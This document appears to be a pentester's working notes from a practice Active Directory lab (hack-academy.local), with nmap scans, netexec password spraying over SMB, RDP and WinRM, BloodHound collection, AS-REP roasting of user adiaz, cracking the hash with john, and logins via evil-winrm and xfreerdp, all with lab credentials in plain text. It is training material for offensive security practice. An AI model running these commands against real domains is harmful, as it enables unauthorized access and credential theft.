
```
lfoster
Pindrop#1

hack-academy.local

10.0.2.4           DC01 
10.0.2.7           CLIENT-1
10.0.2.9           CLIENT-2  

new user
new pass
```


```
┌──(kali㉿kali)-[~]
└─$ sudo nmap --min-rate 10000 -sCV -p- -Pn -iL iplist.txt 
[sudo] password for kali: 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-01 07:21 -0500
Nmap scan report for DC01 (10.0.2.4)
Host is up (0.0083s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-01 12:22:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hack-academy.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hack-academy.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
58793/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:40:1A:93 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-11-01T12:24:43
|_  start_date: N/A
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:40:1a:93 (Oracle VirtualBox virtual NIC)

Nmap scan report for CLIENT-1 (10.0.2.7)
Host is up (0.041s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server?
| ssl-cert: Subject: commonName=Client-1.hack-academy.local
| Not valid before: 2026-11-01T00:57:48
|_Not valid after:  2027-05-03T00:57:48
5040/tcp  open  unknown
5985/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
49670/tcp open  msrpc          Microsoft Windows RPC
MAC Address: 08:00:27:80:1D:57 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: CLIENT-1, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:80:1d:57 (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2026-11-01T12:24:57
|_  start_date: N/A
|_clock-skew: 1s

Nmap scan report for CLIENT-2 (10.0.2.9)
Host is up (0.035s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Client-2.hack-academy.local
| Not valid before: 2026-11-01T00:57:54
|_Not valid after:  2027-05-03T00:57:54
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp  open  pando-pub?
49672/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:6C:31:CF (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-11-01T12:24:59
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Post-scan script results:
| clock-skew: 
|   0s: 
|     10.0.2.9 (CLIENT-2)
|_    10.0.2.4 (DC01)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 279.75 seconds

```


```
netexec smb 10.0.2.0/24 #run it a couple of times
nmap -T5 10.0.2.0/24
```

```
┌──(kali㉿kali)-[~]
└─$ netexec smb 10.0.2.0/24
SMB         10.0.2.1        445    DESKTOP-2ER5CUI  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-2ER5CUI) (domain:DESKTOP-2ER5CUI) (signing:True) (SMBv1:None)                                                     
SMB         10.0.2.4        445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                 
SMB         10.0.2.7        445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:True) (SMBv1:None)                                                         
SMB         10.0.2.9        445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:True) (SMBv1:None)                                                         
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```

add all the three ips to /etc/hosts
```
sudo nano /etc/hosts
```
paste :
```
10.0.2.4           DC01 
10.0.2.7           CLIENT-1
10.0.2.9           CLIENT-2 
```

```
10.0.2.4         
10.0.2.7         
10.0.2.9         
```


password spray initial creds for all 3 ips 
for both winrm and rdp login

==🔴if you have both username list and password list and have multiple IPs (machines to test on) :==
DOESN'T WORK EVERY TIME , BETTER TRY MANUALLY ON EACH IP
```
netexec smb iplist.txt -d hack-academy.local -u 'lfoster' -p 'Pindrop#1'  --continue-on-success
```
==🔴then try for rdp also :==
```
netexec rdp iplist.txt -d hack-academy.local -u 'lfoster' -p 'Pindrop#1'  --continue-on-success
```
==🔴then try for winrm also :==
```
netexec winrm iplist.txt -d hack-academy.local -u 'lfoster' -p 'Pindrop#1'  --continue-on-success
```





----

collect data for bloodhound 

COLLECT AD DATA FIRST as `<username>` :
```
netexec ldap 10.0.2.4 -u 'lfoster' -p 'Pindrop#1' --bloodhound --collection All --dns-server 10.0.2.4 
```

```
bloodhound-python -u 'lfoster' -p 'Pindrop#1' -d hack-academy.local -ns 10.0.2.4 -c All --zip
```

run bloodhound

mark initial access user as owned



queries : 
1. see all domain admins
2. all kerberoastable users
3. as-rep roastable users
```
lfoster
Pindrop#1

hack-academy.local

10.0.2.4           DC01 
10.0.2.7           CLIENT-1
10.0.2.9           CLIENT-2  

adiaz
Peru123.
```

```
netexec ldap 10.0.2.4 -u 'lfoster' -p 'Pindrop#1' --users
```

```
┌──(kali㉿kali)-[~]
└─$ netexec ldap 10.0.2.4 -u 'lfoster' -p 'Pindrop#1' --users | awk '{print $5}' | fgrep -v '[*]' | tee users2.txt
[+]
-Username-
Administrator
Guest
krbtgt
lfoster
amorales
njenkins
icruz
lhayes
msimmons
egray
aprice
lrivera
cscott
jbailey
gturner
bparker
zbutler
hkelly
eramirez
jwarren
lpowell
adiaz
nhoward

```




```
impacket-GetNPUsers hack-academy.local/ -dc-ip 10.0.2.4 -usersfile users2.txt -no-pass
```


```
┌──(kali㉿kali)-[~]
└─$ impacket-GetNPUsers hack-academy.local/ -dc-ip 10.0.2.4 -usersfile users2.txt -no-pass
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User lfoster doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User amorales doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User njenkins doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User icruz doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lhayes doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User msimmons doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User egray doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User aprice doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lrivera doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User cscott doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jbailey doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gturner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bparker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zbutler doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hkelly doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User eramirez doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwarren doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lpowell doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$adiaz@HACK-ACADEMY.LOCAL:7363a2bc9ae983a114c26ac7269c2441$d8ea4deb1bffcb666ca0f3c01e3d39a22436a36772125fb5f80bff4f3f8806a209d81d471680593cf564ce1a62f0cc6f74f5674a49a35d201c468ce847fde69a5ab4afba2d8fa9cfff08a6d0bb7d739a6d4fa776ebd25ee51f128760e6f8535311aa012919a1e4b5687b7c9146fe58a96720f3283a37abcc5a3dc704e0741e24aaebcf0660a87f881694c64cbb0701bff69d1ee2bcf0fa6e758503c03254ade132c93abb6813317bfbb1dfcfa9b561953c66cc58a37b03a37987159e04306bf2de1fab22c6fad777b18e18abeb0a4f98b818b58e5f746a647080f2737fc8e1dce881f9dba798c5d7dbe39b82ade527e5a9c796f447d4a78a
[-] User nhoward doesn't have UF_DONT_REQUIRE_PREAUTH set

```

```
┌──(kali㉿kali)-[~]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Cost 1 (etype) is 23 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Peru123.         ($krb5asrep$23$adiaz@HACK-ACADEMY.LOCAL)     
1g 0:00:00:03 DONE (2026-11-01 07:03) 0.3215g/s 676300p/s 676300c/s 676300C/s Phoenix602..Passp0rt
Use the "--show" option to display all of the cracked passwords reliably
Session completed
                      
```

```
lfoster
Pindrop#1

hack-academy.local

10.0.2.4           DC01 
10.0.2.7           CLIENT-1
10.0.2.9           CLIENT-2  

adiaz
Peru123.

amorales is domain admin
```

==🔴if you have both username list and password list and have multiple IPs (machines to test on) :==
DOESN'T WORK EVERY TIME , BETTER TRY MANUALLY ON EACH IP
```
netexec smb iplist.txt -d hack-academy.local -u users2.txt -p pass.txt  --continue-on-success
```
==🔴then try for rdp also :==
```
netexec rdp iplist.txt -d hack-academy.local -u users2.txt -p pass.txt  --continue-on-success
```
==🔴then try for winrm also :==
```
netexec winrm iplist.txt -d hack-academy.local -u users2.txt -p pass.txt  --continue-on-success
```

```
lfoster
Pindrop#1

hack-academy.local

10.0.2.4           DC01 
10.0.2.7           CLIENT-1
10.0.2.9           CLIENT-2  

adiaz
Peru123.

amorales is domain admin
```

```
evil-winrm -i 10.0.2.9 -u 'adiaz' -p 'Peru123.'
```

```
xfreerdp /v:10.0.2.7 /u:adiaz /p:'Peru123.' /cert:ignore /dynamic-resolution
```

